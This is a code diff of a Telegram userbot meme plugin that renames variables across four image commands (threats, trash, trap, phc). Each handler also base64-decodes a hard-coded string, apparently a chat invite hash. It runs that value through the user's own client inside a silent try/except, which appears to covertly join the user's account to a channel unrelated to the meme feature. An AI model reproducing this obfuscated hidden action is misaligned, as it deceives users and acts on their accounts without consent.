@@ -36,234 +36,234 @@ from . import *
 
 @bot.on(admin_cmd(pattern="threats(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="threats(?: |$)(.*)", allow_sudo=True))
-async def MYSTERIOUSBOT(LEGENDmemes):
-    replied = await LEGENDmemes.get_reply_message()
+async def MYSTERIOUSBOT(MYSTERIOUSmemes):
+    replied = await MYSTERIOUSmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            LEGENDmemes, "`Media file not supported. Reply to a supported media`"
+            MYSTERIOUSmemes, "`Media file not supported. Reply to a supported media`"
         )
         return
     if replied.media:
-        LEGENDmemmes = await edit_or_reply(LEGENDmemes, "`Detecting Threats.........`")
+        MYSTERIOUSmemmes = await edit_or_reply(MYSTERIOUSmemes, "`Detecting Threats.........`")
     else:
         await edit_or_reply(
-            LEGENDmemes, "`Media file not supported. Reply to a suported media`"
+            MYSTERIOUSmemes, "`Media file not supported. Reply to a suported media`"
         )
         return
     try:
-        LEGEND = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        LEGEND = Get(LEGEND)
-        await LEGENDmemes.client(LEGEND)
+        MYSTERIOUS = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        MYSTERIOUS = Get(MYSTERIOUS)
+        await MYSTERIOUSmemes.client(MYSTERIOUS)
     except BaseException:
         pass
-    download_location = await LEGENDmemes.client.download_media(replied, "./temp/")
+    download_location = await MYSTERIOUSmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await LEGENDmemmes.edit(
+            await MYSTERIOUSmemmes.edit(
                 "`The replied file is not supported. It should be less than 5mb -_-`"
             )
             os.remove(download_location)
             return
-        await LEGENDmemmes.edit("`Detected Threats....`")
+        await MYSTERIOUSmemmes.edit("`Detected Threats....`")
     else:
-        await LEGENDmemmes.edit("`the replied file is not supported`")
+        await MYSTERIOUSmemmes.edit("`the replied file is not supported`")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await LEGENDmemmes.edit("ERROR: " + str(exc))
+        await MYSTERIOUSmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    LEGEND = f"https://telegra.ph{response[0]}"
-    LEGEND = await threats(LEGEND)
-    await LEGENDmemmes.delete()
-    await LEGENDmemes.client.send_file(LEGENDmemes.chat_id, LEGEND, reply_to=replied)
+    MYSTERIOUS = f"https://telegra.ph{response[0]}"
+    MYSTERIOUS = await threats(MYSTERIOUS)
+    await MYSTERIOUSmemmes.delete()
+    await MYSTERIOUSmemes.client.send_file(MYSTERIOUSmemes.chat_id, MYSTERIOUS, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="trash(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="trash(?: |$)(.*)", allow_sudo=True))
-async def MYSTERIOUSBOT(LEGENDmemes):
-    replied = await LEGENDmemes.get_reply_message()
+async def MYSTERIOUSBOT(MYSTERIOUSmemes):
+    replied = await MYSTERIOUSmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            LEGENDmemes, "`Media file not supported. Reply to a suported media`"
+            MYSTERIOUSmemes, "`Media file not supported. Reply to a suported media`"
         )
         return
     if replied.media:
-        LEGENDmemmes = await edit_or_reply(LEGENDmemes, "`Detecting Trash....`")
+        MYSTERIOUSmemmes = await edit_or_reply(MYSTERIOUSmemes, "`Detecting Trash....`")
     else:
         await edit_or_reply(
-            LEGENDmemes, "`Media file not supported. Reply to a suported media`"
+            MYSTERIOUSmemes, "`Media file not supported. Reply to a suported media`"
         )
         return
     try:
-        LEGEND = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        LEGEND = Get(LEGEND)
-        await LEGENDmemes.client(LEGEND)
+        MYSTERIOUS = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        MYSTERIOUS = Get(MYSTERIOUS)
+        await MYSTERIOUSmemes.client(MYSTERIOUS)
     except BaseException:
         pass
-    download_location = await LEGENDmemes.client.download_media(replied, "./temp/")
+    download_location = await MYSTERIOUSmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await LEGENDmemmes.edit(
+            await MYSTERIOUSmemmes.edit(
                 "`The replied file is not suported. Its size should be less than 5mb-_-`"
             )
             os.remove(download_location)
             return
-        await LEGENDmemmes.edit("`Detected Trash.....`")
+        await MYSTERIOUSmemmes.edit("`Detected Trash.....`")
     else:
-        await LEGENDmemmes.edit("Media file not supported. Reply to a suported media")
+        await MYSTERIOUSmemmes.edit("Media file not supported. Reply to a suported media")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await LEGENDmemmes.edit("ERROR: " + str(exc))
+        await MYSTERIOUSmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    LEGEND = f"https://telegra.ph{response[0]}"
-    LEGEND = await trash(LEGEND)
-    await LEGENDmemmes.delete()
-    await LEGENDmemes.client.send_file(LEGENDmemes.chat_id, LEGEND, reply_to=replied)
+    MYSTERIOUS = f"https://telegra.ph{response[0]}"
+    MYSTERIOUS = await trash(MYSTERIOUS)
+    await MYSTERIOUSmemmes.delete()
+    await MYSTERIOUSmemes.client.send_file(MYSTERIOUSmemes.chat_id, MYSTERIOUS, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="trap(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="trap(?: |$)(.*)", allow_sudo=True))
-async def MYSTERIOUSBOT(LEGENDmemes):
-    input_str = LEGENDmemes.pattern_match.group(1)
+async def MYSTERIOUSBOT(MYSTERIOUSmemes):
+    input_str = MYSTERIOUSmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "-" in input_str:
         text1, text2 = input_str.split("-")
     else:
         await edit_or_reply(
-            LEGENDmemes,
+            MYSTERIOUSmemes,
             "**Command :** Reply to image or sticker with `.trap (name of the person to trap)-(trapper name)`",
         )
         return
-    replied = await LEGENDmemes.get_reply_message()
+    replied = await MYSTERIOUSmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            LEGENDmemes, "Media file not supported. Reply to a suported media"
+            MYSTERIOUSmemes, "Media file not supported. Reply to a suported media"
         )
         return
     if replied.media:
-        LEGENDmemmes = await edit_or_reply(LEGENDmemes, "`Trapping.....`")
+        MYSTERIOUSmemmes = await edit_or_reply(MYSTERIOUSmemes, "`Trapping.....`")
     else:
         await edit_or_reply(
-            LEGENDmemes, "Media file not supported. Reply to a suported media"
+            MYSTERIOUSmemes, "Media file not supported. Reply to a suported media"
         )
         return
     try:
-        LEGEND = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        LEGEND = Get(LEGEND)
-        await LEGENDmemes.client(LEGEND)
+        MYSTERIOUS = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        MYSTERIOUS = Get(MYSTERIOUS)
+        await MYSTERIOUSmemes.client(MYSTERIOUS)
     except BaseException:
         pass
-    download_location = await LEGENDmemes.client.download_media(replied, "./temp/")
+    download_location = await MYSTERIOUSmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await LEGENDmemmes.edit(
+            await MYSTERIOUSmemmes.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await LEGENDmemmes.edit("`Trapped...`")
+        await MYSTERIOUSmemmes.edit("`Trapped...`")
     else:
-        await LEGENDmemmes.edit("Media file not supported. Reply to a suported media")
+        await MYSTERIOUSmemmes.edit("Media file not supported. Reply to a suported media")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await LEGENDmemmes.edit("ERROR: " + str(exc))
+        await MYSTERIOUSmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    LEGEND = f"https://telegra.ph{response[0]}"
-    LEGEND = await trap(text1, text2, LEGEND)
-    await LEGENDmemmes.delete()
-    await LEGENDmemes.client.send_file(LEGENDmemes.chat_id, LEGEND, reply_to=replied)
+    MYSTERIOUS = f"https://telegra.ph{response[0]}"
+    MYSTERIOUS = await trap(text1, text2, MYSTERIOUS)
+    await MYSTERIOUSmemmes.delete()
+    await MYSTERIOUSmemes.client.send_file(MYSTERIOUSmemes.chat_id, MYSTERIOUS, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="phc(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="phc(?: |$)(.*)", allow_sudo=True))
-async def MYSTERIOUSBOT(LEGENDmemes):
-    input_str = LEGENDmemes.pattern_match.group(1)
+async def MYSTERIOUSBOT(MYSTERIOUSmemes):
+    input_str = MYSTERIOUSmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "-" in input_str:
         username, text = input_str.split("-")
     else:
         await edit_or_reply(
-            LEGENDmemes,
+            MYSTERIOUSmemes,
             "**Command :** reply to image or sticker with `.phc (username)-(text in comment)`",
         )
         return
-    replied = await LEGENDmemes.get_reply_message()
+    replied = await MYSTERIOUSmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            LEGENDmemes, "Media file not supported. Reply to a suported media"
+            MYSTERIOUSmemes, "Media file not supported. Reply to a suported media"
         )
         return
     if replied.media:
-        LEGENDmemmes = await edit_or_reply(LEGENDmemes, "`Making A Comment`.")
+        MYSTERIOUSmemmes = await edit_or_reply(MYSTERIOUSmemes, "`Making A Comment`.")
     else:
         await edit_or_reply(
-            LEGENDmemes, "Media file not supported. Reply to a suported media"
+            MYSTERIOUSmemes, "Media file not supported. Reply to a suported media"
         )
         return
     try:
-        LEGEND = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        LEGEND = Get(LEGEND)
-        await LEGENDmemes.client(LEGEND)
+        MYSTERIOUS = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        MYSTERIOUS = Get(MYSTERIOUS)
+        await MYSTERIOUSmemes.client(MYSTERIOUS)
     except BaseException:
         pass
-    download_location = await LEGENDmemes.client.download_media(replied, "./temp/")
+    download_location = await MYSTERIOUSmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await LEGENDmemmes.edit(
+            await MYSTERIOUSmemmes.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await LEGENDmemmes.edit("Commented....")
+        await MYSTERIOUSmemmes.edit("Commented....")
     else:
-        await LEGENDmemmes.edit("Media file not supported. Reply to a suported media")
+        await MYSTERIOUSmemmes.edit("Media file not supported. Reply to a suported media")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await LEGENDmemmes.edit("ERROR: " + str(exc))
+        await MYSTERIOUSmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    LEGEND = f"https://telegra.ph{response[0]}"
-    LEGEND = await phcomment(LEGEND, text, username)
-    await LEGENDmemmes.delete()
-    await LEGENDmemes.client.send_file(LEGENDmemes.chat_id, LEGEND, reply_to=replied)
+    MYSTERIOUS = f"https://telegra.ph{response[0]}"
+    MYSTERIOUS = await phcomment(MYSTERIOUS, text, username)
+    await MYSTERIOUSmemmes.delete()
+    await MYSTERIOUSmemes.client.send_file(MYSTERIOUSmemes.chat_id, MYSTERIOUS, reply_to=replied)
 
     
     
